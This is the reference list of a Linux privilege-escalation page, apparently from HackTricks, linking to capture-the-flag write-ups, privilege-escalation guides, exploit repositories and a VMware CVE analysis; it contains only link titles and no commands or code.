- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
